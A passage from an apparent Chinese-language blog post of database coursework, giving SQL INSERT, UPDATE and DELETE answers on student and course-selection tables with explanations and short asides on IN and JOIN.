class="hljs n1ql"><span class="hljs-keyword">SELECT</span> student.sno , student.sname , V_AVG_S_G.agrade<br><span class="hljs-keyword">FROM</span> V_AVG_S_G , student<br><span class="hljs-keyword">WHERE</span> student.sno = V_AVG_S_G.sno<br><span class="hljs-keyword">HAVING</span> V_AVG_S_G.agrade &gt;<span class="hljs-number">90</span> ;<br></code></pre></td></tr></table></figure><h1 id="试验系统作业5"><a href="#试验系统作业5" class="headerlink" title="试验系统作业5"></a>试验系统作业5</h1><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">应用<span class="hljs-keyword">INSERT</span>,<span class="hljs-keyword">UPDATE</span>,<span class="hljs-keyword">DELETE</span>语句进行更新操作；<br><br>  （<span class="hljs-number">1</span>）插入如下学生记录（学号：<span class="hljs-number">08030</span>，姓名：李莉，年龄：<span class="hljs-number">18</span>）<br><br>  （<span class="hljs-number">2</span>）插入如下选课记录（<span class="hljs-number">08030</span>，<span class="hljs-number">1</span>）<br><br>  （<span class="hljs-number">3</span>）计算机系学生年龄改成<span class="hljs-number">20</span><br><br>  （<span class="hljs-number">4</span>）数学系所有学生成绩改成<span class="hljs-number">0</span><br><br>  （<span class="hljs-number">5</span>）把低于总平均成绩的女同学成绩提高<span class="hljs-number">5</span>分<br><br>  （<span class="hljs-number">6</span>）修改<span class="hljs-number">2</span>号课程的成绩，若成绩小于<span class="hljs-number">75</span>分提高<span class="hljs-number">5</span>％，成绩大于<span class="hljs-number">75</span>时提高<span class="hljs-number">4</span>％（两个语句实现，注意顺序）<br><br>  （<span class="hljs-number">7</span>）删除<span class="hljs-number">08030</span>学生信息<br><br>  （<span class="hljs-number">8</span>）删除SC表中无成绩的记录<br><br>  （<span class="hljs-number">9</span>）删除张娜的选课记录<br><br>  （<span class="hljs-number">10</span>）删除数学系所有学生选课记录<br><br>  （<span class="hljs-number">11</span>）删除不及格的学生选课记录<br><br>  （<span class="hljs-number">12</span>）查询每一门课程成绩都大于等于<span class="hljs-number">80</span>分的学生学号、姓名和性别，把值送往另一个已经存在的基本表STU(SNO,SNAME,SSEX)中<br><br>  （<span class="hljs-number">13</span>）统计<span class="hljs-number">3</span>门以上课程不及格的学生，把相应的学生姓名、系别追加到另外一个表中<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>）插入学生记录（学号：<span class="hljs-number">08030</span>，姓名：李莉，年龄：<span class="hljs-number">18</span>）<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student (SNO, SNAME, SAGE) <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;08030&#x27;</span>, <span class="hljs-string">&#x27;李莉&#x27;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 语句用于向 student 表插入一条新的记录，包含学生的学号（SNO）、姓名（SNAME）和年龄（SAGE）。<br><br><br>（<span class="hljs-number">2</span>）插入选课记录（<span class="hljs-number">08030</span>，<span class="hljs-number">1</span>）<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> SC (SNO, CNO) <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;08030&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 语句用于向 SC（选课）表插入一条记录，表示学号为<span class="hljs-number">08030</span>的学生选择了课程编号为<span class="hljs-number">1</span>的课程。<br><br><br>（<span class="hljs-number">3</span>）计算机系学生年龄改成<span class="hljs-number">20</span><br><span class="hljs-keyword">UPDATE</span> student <br><span class="hljs-keyword">SET</span> SAGE <span class="hljs-operator">=</span> <span class="hljs-number">20</span> <br><span class="hljs-keyword">WHERE</span> DEPARTMENT <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;计算机系&#x27;</span>;<br><span class="hljs-keyword">UPDATE</span> 语句用于更新 student 表中的数据，将计算机系的学生的年龄（SAGE）设置为<span class="hljs-number">20</span>。<br><br><br>（<span class="hljs-number">4</span>）数学系所有学生成绩改成<span class="hljs-number">0</span><br><span class="hljs-keyword">UPDATE</span> SC <br><span class="hljs-keyword">SET</span> grade <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> DEPARTMENT <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;数学系&#x27;</span>);<br><span class="hljs-keyword">UPDATE</span> 语句将数学系所有学生的成绩（grade）设置为<span class="hljs-number">0</span>。通过子查询，首先查找数学系的所有学生学号（SNO），然后更新 SC 表中的成绩。<br><br><br>（<span class="hljs-number">5</span>）把低于总平均成绩的女同学成绩提高<span class="hljs-number">5</span>分<br><span class="hljs-keyword">UPDATE</span> SC <br><span class="hljs-keyword">SET</span> grade <span class="hljs-operator">=</span> grade <span class="hljs-operator">+</span> <span class="hljs-number">5</span> <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> SEX <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;女&#x27;</span> <span class="hljs-keyword">AND</span> SNO <span class="hljs-keyword">IN</span> (<br>        <span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> SC <br>        <span class="hljs-keyword">WHERE</span> grade <span class="hljs-operator">&lt;</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(grade) <span class="hljs-keyword">FROM</span> SC)<br>    )<br>);<br>这里使用了多层子查询。首先计算总成绩的平均值（<span class="hljs-built_in">AVG</span>(grade)），然后查找成绩低于该平均值的女性学生，并将她们的成绩提高<span class="hljs-number">5</span>分。<br><br><br>（<span class="hljs-number">6</span>）修改<span class="hljs-number">2</span>号课程的成绩，若成绩小于<span class="hljs-number">75</span>分提高<span class="hljs-number">5</span><span class="hljs-operator">%</span>，成绩大于<span class="hljs-number">75</span>时提高<span class="hljs-number">4</span><span class="hljs-operator">%</span><br><span class="hljs-comment">-- 对成绩小于75的学生提高5%</span><br><span class="hljs-keyword">UPDATE</span> SC <br><span class="hljs-keyword">SET</span> grade <span class="hljs-operator">=</span> grade <span class="hljs-operator">*</span> <span class="hljs-number">1.05</span> <br><span class="hljs-keyword">WHERE</span> CNO <span class="hljs-operator">=</span> <span class="hljs-number">2</span> <span class="hljs-keyword">AND</span> grade <span class="hljs-operator">&lt;</span> <span class="hljs-number">75</span>;<br><br><span class="hljs-comment">-- 对成绩大于75的学生提高4%</span><br><span class="hljs-keyword">UPDATE</span> SC <br><span class="hljs-keyword">SET</span> grade <span class="hljs-operator">=</span> grade <span class="hljs-operator">*</span> <span class="hljs-number">1.04</span> <br><span class="hljs-keyword">WHERE</span> CNO <span class="hljs-operator">=</span> <span class="hljs-number">2</span> <span class="hljs-keyword">AND</span> grade <span class="hljs-operator">&gt;=</span> <span class="hljs-number">75</span>;<br>第一条 <span class="hljs-keyword">UPDATE</span> 语句针对课程号为<span class="hljs-number">2</span>且成绩小于<span class="hljs-number">75</span>分的学生，将成绩提高<span class="hljs-number">5</span><span class="hljs-operator">%</span>。<br>第二条 <span class="hljs-keyword">UPDATE</span> 语句针对课程号为<span class="hljs-number">2</span>且成绩大于或等于<span class="hljs-number">75</span>分的学生，将成绩提高<span class="hljs-number">4</span><span class="hljs-operator">%</span>。<br><br><br>（<span class="hljs-number">7</span>）删除学号为<span class="hljs-number">08030</span>的学生信息<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> student <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;08030&#x27;</span>;<br><span class="hljs-keyword">DELETE</span> 语句删除 student 表中学号为<span class="hljs-number">08030</span>的学生记录。<br><br><br>（<span class="hljs-number">8</span>）删除SC表中无成绩的记录<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> grade <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;<br>删除 SC 表中成绩为空（<span class="hljs-keyword">NULL</span>）的选课记录。<br><br><br>（<span class="hljs-number">9</span>）删除张娜的选课记录<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> SNAME <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;张娜&#x27;</span>);<br>通过子查询，首先查找姓名为张娜的学生的学号（SNO），然后删除 SC 表中对应的选课记录。<br><br><br>（<span class="hljs-number">10</span>）删除数学系所有学生选课记录<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> DEPARTMENT <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;数学系&#x27;</span>);<br>删除 SC 表中所有数学系学生的选课记录。通过子查询，获取数学系学生的学号（SNO）。<br><br><br>（<span class="hljs-number">11</span>）删除不及格的学生选课记录<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> grade <span class="hljs-operator">&lt;</span> <span class="hljs-number">60</span>;<br>删除 SC 表中成绩低于<span class="hljs-number">60</span>的选课记录（假设<span class="hljs-number">60</span>为及格线）。<br><br><br>（<span class="hljs-number">12</span>）查询每一门课程成绩都大于等于<span class="hljs-number">80</span>分的学生学号、姓名和性别，把值送往另一个已经存在的基本表STU(SNO, SNAME, SSEX)中<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> STU (SNO, SNAME, SSEX)<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> s.SNO, s.SNAME, s.SSEX<br><span class="hljs-keyword">FROM</span> student s<br><span class="hljs-keyword">JOIN</span> SC sc <span class="hljs-keyword">ON</span> s.SNO <span class="hljs-operator">=</span> sc.SNO<br><span class="hljs-keyword">WHERE</span> sc.grade <span class="hljs-operator">&gt;=</span> <span class="hljs-number">80</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> s.SNO, s.SNAME, s.SSEX<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> sc.CNO) <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> course);<br>这个语句首先筛选出所有成绩大于等于<span class="hljs-number">80</span>分的学生，并把他们的学号、姓名和性别插入到 STU 表中。<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> 和 <span class="hljs-keyword">HAVING</span> 用来确保每个学生的每门课程成绩都大于等于<span class="hljs-number">80</span>。<br><br><br>（<span class="hljs-number">13</span>）统计<span class="hljs-number">3</span>门以上课程不及格的学生，把相应的学生姓名、系别追加到另外一个表中<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> failed_students (SNAME, DEPARTMENT)<br><span class="hljs-keyword">SELECT</span> s.SNAME, s.DEPARTMENT<br><span class="hljs-keyword">FROM</span> student s<br><span class="hljs-keyword">JOIN</span> SC sc <span class="hljs-keyword">ON</span> s.SNO <span class="hljs-operator">=</span> sc.SNO<br><span class="hljs-keyword">WHERE</span> sc.grade <span class="hljs-operator">&lt;</span> <span class="hljs-number">60</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> s.SNO, s.SNAME, s.DEPARTMENT<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> sc.CNO) <span class="hljs-operator">&gt;</span> <span class="hljs-number">3</span>;<br>这个查询通过连接 student 表和 SC 表，筛选出不及格（成绩小于<span class="hljs-number">60</span>）超过<span class="hljs-number">3</span>门课程的学生，并将他们的姓名和系别插入到 failed_students 表中。<br></code></pre></td></tr></table></figure><h5 id="1）插入学生记录（学号：08030，姓名：李莉，年龄：18）"><a href="#1）插入学生记录（学号：08030，姓名：李莉，年龄：18）" class="headerlink" title="1）插入学生记录（学号：08030，姓名：李莉，年龄：18）"></a>1）插入学生记录（学号：08030，姓名：李莉，年龄：18）</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> student (SNO, SNAME, SAGE) <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;08030&#x27;</span>, <span class="hljs-string">&#x27;李莉&#x27;</span>, <span class="hljs-number">18</span>);<br></code></pre></td></tr></table></figure><p>INSERT INTO 语句用于向 student 表插入一条新的记录，包含学生的学号（SNO）、姓名（SNAME）和年龄（SAGE）。</p><h5 id="（2）插入选课记录（08030，1）"><a href="#（2）插入选课记录（08030，1）" class="headerlink" title="（2）插入选课记录（08030，1）"></a>（2）插入选课记录（08030，1）</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> SC (SNO, CNO) <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;08030&#x27;</span>, <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>INSERT INTO 语句用于向 SC（选课）表插入一条记录，表示学号为08030的学生选择了课程编号为1的课程。</p><h5 id="（3）计算机系学生年龄改成20"><a href="#（3）计算机系学生年龄改成20" class="headerlink" title="（3）计算机系学生年龄改成20"></a>（3）计算机系学生年龄改成20</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">UPDATE student <br><span class="hljs-keyword">SET</span> SAGE <span class="hljs-comment">= 20</span> <br>WHERE <span class="hljs-comment">DEPARTMENT =</span> <span class="hljs-comment">&#x27;is&#x27;</span>;<br></code></pre></td></tr></table></figure><p>UPDATE 语句用于更新 student 表中的数据，将计算机系的学生的年龄（SAGE）设置为20。</p><h5 id="（4）数学系所有学生成绩改成0"><a href="#（4）数学系所有学生成绩改成0" class="headerlink" title="（4）数学系所有学生成绩改成0"></a>（4）数学系所有学生成绩改成0</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">UPDATE</span> SC <br><span class="hljs-keyword">SET</span> grade = <span class="hljs-number">0</span> <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> sdept = <span class="hljs-string">&#x27;ma&#x27;</span>);<br></code></pre></td></tr></table></figure><p>IN语句的解释：</p><p>下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Websites<br> <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;Google&#x27;</span>,<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>);<br></code></pre></td></tr></table></figure><p>UPDATE 语句将数学系所有学生的成绩（grade）设置为0。通过子查询，首先查找数学系的所有学生学号（SNO），然后更新 SC 表中的成绩。</p><h5 id="（5）把低于总平均成绩的女同学成绩提高5分"><a href="#（5）把低于总平均成绩的女同学成绩提高5分" class="headerlink" title="（5）把低于总平均成绩的女同学成绩提高5分"></a>（5）把低于总平均成绩的女同学成绩提高5分</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">UPDATE</span> SC <br><span class="hljs-keyword">SET</span> grade = grade + <span class="hljs-number">5</span> <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> SSEX = <span class="hljs-string">&#x27;女&#x27;</span> <span class="hljs-keyword">AND</span> SNO <span class="hljs-keyword">IN</span> (<br>        <span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> SC <br>        <span class="hljs-keyword">WHERE</span> grade &lt; (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(grade) <span class="hljs-keyword">FROM</span> SC)<br>    )<br>);<br></code></pre></td></tr></table></figure><p>这里使用了多层子查询。首先计算总成绩的平均值（AVG(grade)），然后查找成绩低于该平均值的女性学生，并将她们的成绩提高5分。</p><h5 id="（6）修改2号课程的成绩，若成绩小于75分提高5-，成绩大于75时提高4"><a href="#（6）修改2号课程的成绩，若成绩小于75分提高5-，成绩大于75时提高4" class="headerlink" title="（6）修改2号课程的成绩，若成绩小于75分提高5%，成绩大于75时提高4%"></a>（6）修改2号课程的成绩，若成绩小于75分提高5%，成绩大于75时提高4%</h5><p>– 对成绩小于75的学生提高5%</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UPDATE</span> SC <br><span class="hljs-attribute">SET</span> grade = grade * <span class="hljs-number">1</span>.<span class="hljs-number">05</span> <br><span class="hljs-attribute">WHERE</span> CNO = <span class="hljs-number">2</span> AND grade &lt; <span class="hljs-number">75</span>;<br></code></pre></td></tr></table></figure><p>– 对成绩大于75的学生提高4%</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">UPDATE SC <br>SET grade <span class="hljs-operator">=</span> grade * <span class="hljs-number">1.04</span> <br>WHERE CNO <span class="hljs-operator">=</span> <span class="hljs-number">2</span> AND grade &gt;<span class="hljs-operator">=</span> <span class="hljs-number">75</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>第一条 UPDATE 语句针对课程号为2且成绩小于75分的学生，将成绩提高5%。<br>第二条 UPDATE 语句针对课程号为2且成绩大于或等于75分的学生，将成绩提高4%。</p><h5 id="（7）删除学号为08030的学生信息"><a href="#（7）删除学号为08030的学生信息" class="headerlink" title="（7）删除学号为08030的学生信息"></a>（7）删除学号为08030的学生信息</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> student <br><span class="hljs-keyword">WHERE</span> SNO = <span class="hljs-string">&#x27;08030&#x27;</span>;<br></code></pre></td></tr></table></figure><p>DELETE 语句删除 student 表中学号为08030的学生记录。</p><h5 id="（8）删除SC表中无成绩的记录"><a href="#（8）删除SC表中无成绩的记录" class="headerlink" title="（8）删除SC表中无成绩的记录"></a>（8）删除SC表中无成绩的记录</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> grade <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>删除 SC 表中成绩为空（NULL）的选课记录。</p><h5 id="（9）删除张娜的选课记录"><a href="#（9）删除张娜的选课记录" class="headerlink" title="（9）删除张娜的选课记录"></a>（9）删除张娜的选课记录</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> SNO = (<span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> SNAME = <span class="hljs-string">&#x27;张娜&#x27;</span>);<br></code></pre></td></tr></table></figure><p>通过子查询，首先查找姓名为张娜的学生的学号（SNO），然后删除 SC 表中对应的选课记录。</p><h5 id="（10）删除数学系所有学生选课记录"><a href="#（10）删除数学系所有学生选课记录" class="headerlink" title="（10）删除数学系所有学生选课记录"></a>（10）删除数学系所有学生选课记录</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> SNO <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> SNO <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> DEPARTMENT = <span class="hljs-string">&#x27;数学系&#x27;</span>);<br></code></pre></td></tr></table></figure><p>删除 SC 表中所有数学系学生的选课记录。通过子查询，获取数学系学生的学号（SNO）。</p><h5 id="（11）删除不及格的学生选课记录"><a href="#（11）删除不及格的学生选课记录" class="headerlink" title="（11）删除不及格的学生选课记录"></a>（11）删除不及格的学生选课记录</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> SC <br><span class="hljs-keyword">WHERE</span> grade &lt; <span class="hljs-number">60</span>;<br></code></pre></td></tr></table></figure><p>删除 SC 表中成绩低于60的选课记录（假设60为及格线）。</p><h5 id="（12）查询每一门课程成绩都大于等于80分的学生学号、姓名和性别，把值送往另一个已经存在的基本表STU-SNO-SNAME-SSEX-中"><a href="#（12）查询每一门课程成绩都大于等于80分的学生学号、姓名和性别，把值送往另一个已经存在的基本表STU-SNO-SNAME-SSEX-中" class="headerlink" title="（12）查询每一门课程成绩都大于等于80分的学生学号、姓名和性别，把值送往另一个已经存在的基本表STU(SNO, SNAME, SSEX)中"></a>（12）查询每一门课程成绩都大于等于80分的学生学号、姓名和性别，把值送往另一个已经存在的基本表STU(SNO, SNAME, SSEX)中</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> STU (SNO, SNAME, SSEX)<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> s.SNO, s.SNAME, s.SSEX<br><span class="hljs-keyword">FROM</span> student s<br><span class="hljs-keyword">JOIN</span> SC sc <span class="hljs-keyword">ON</span> s.SNO = sc.SNO<br><span class="hljs-keyword">WHERE</span> sc.grade &gt;= <span class="hljs-number">80</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> s.SNO, s.SNAME, s.SSEX<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span> sc.CNO) = (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(*) <span class="hljs-keyword">FROM</span> course);<br></code></pre></td></tr></table></figure><p><code>DISTINCT</code> 确保结果集中没有重复的行。</p><h6 id="JOIN的作用："><a href="#JOIN的作用：" class="headerlink" title="JOIN的作用："></a><strong>JOIN的作用：</strong></h6><p>如果表1和表2之间有关系，比如通过某个键（如 <code>id</code>），你可以使用 <code>JOIN</code> 来查询它们的组合：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> *<br><span class="hljs-attribute">FROM</span> 表<span class="hljs-number">1</span><br><span class="hljs-attribute">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-literal">ON</span> 表<span class="hljs-number">1</span>.id = 表<span class="hljs-number">2</span>.foreign_id;<br></code></pre></td></tr></table></figure><p>这里，<code>表1.id</code> 是表1中的主键，<code>表2.foreign_id</code> 是表2中对应的外键。</p><p>eg:</p><p>假设我们有两个表：</p><p>用户表 (<code>users</code>):</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Carol</td></tr></tbody></table><p>订单表 (<code>orders</code>):</p><table><thead><tr><th>order_id</th><th>user_id</th><th>product</th></tr></thead><tbody><tr><td>101</td><td>1</td><td>Laptop</td></tr><tr><td>102</td><td>1</td><td>Mouse</td></tr><tr><td>103</td><td>2</td><td>Keyboard</td></tr><tr><td>104</td><td>3</td><td>Monitor</td></tr><tr><td>105</td><td>4</td><td>Printer</td></tr></tbody></table><p>我们希望查询每个用户的订单信息，可以使用以下 SQL 查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> users<br><span class="hljs-keyword">JOIN</span> orders <span class="hljs-keyword">ON</span> users.id <span class="hljs-operator">=</span> orders.user_id;<br></code></pre></td></tr></table></figure><ul><li><strong><code>SELECT \*</code></strong>: 我们选择所有列，包括 <code>users</code> 表和 <code>orders</code> 表的所有字段。</li><li><strong><code>FROM users</code></strong>: 从 <code>users</code> 表开始查询。</li><li><strong><code>JOIN orders ON users.id = orders.user_id</code></strong>: 将 <code>users</code> 表和 <code>orders</code> 表联接，条件是 <code>users</code> 表的 <code>id</code> 与 <code>orders</code> 表的 